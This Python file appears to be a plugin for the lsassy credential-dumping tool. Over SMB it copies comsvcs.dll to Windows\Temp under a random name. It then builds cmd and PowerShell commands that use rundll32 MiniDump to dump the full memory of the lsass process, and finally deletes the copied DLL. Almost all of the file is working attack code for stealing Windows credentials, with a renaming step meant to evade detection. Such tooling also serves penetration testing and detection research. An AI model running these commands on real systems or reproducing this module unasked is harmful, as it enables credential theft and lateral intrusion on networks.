from lsassy.dumpmethod.idumpmethod import IDumpMethod
import logging
import time
import random
import string

class CustomBuffer():
    def __init__(self):
        self._buffer = b""
        self._currentOffset = 0
        self._total_read = 0

    def read(self, size):
        if self._currentOffset >= len(self._buffer):
            return b""
        self._currentOffset += size
        buff = self._buffer[self._currentOffset - size: min(self._currentOffset, len(self._buffer))]
        self._currentOffset  = min(self._currentOffset, len(self._buffer))
        return buff

    def write(self, stream):
        self._buffer += stream


class DumpMethod(IDumpMethod):

    need_debug_privilege = True

    def __init__(self, session):
        super().__init__(session)
        self.comsvcs_copied = False
        self.comsvcs_copy_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        self.comsvcs_copy_path = "\\Windows\\Temp\\"
        logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))

    def get_commands(self):
        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:{}{}, MiniDump ^%B {}{} full""".format(
            self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
        )
        pwsh_command = """rundll32.exe C:{}{}, MiniDump (Get-Process lsass).Id {}{} full""".format(
             self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }


    def prepare(self, options):
        try:
            logging.info("Opening comsvcs.dll")
            buff = CustomBuffer()
            self._session.smb_session.getFile("C$", "\\Windows\\System32\\comsvcs.dll", buff.write)
            self._session.smb_session.putFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name, buff.read)
            logging.success("Comsvcs.dll successfuly copied")
            self.comsvcs_copied = True
            return True
        except Exception as e:
            print(e)
            return None

    def clean(self):
        if self.comsvcs_copied:
            t = time.time()
            while True:
                try:
                    self._session.smb_session.deleteFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name)
                    logging.debug("Comsvcs.dll copy successfully deleted")
                    return True
                except Exception as e:
                    if time.time() - t > 5:
                        logging.warning("Comsvcs.dll copy deletion error.")
                        return False
                    time.sleep(0.2)
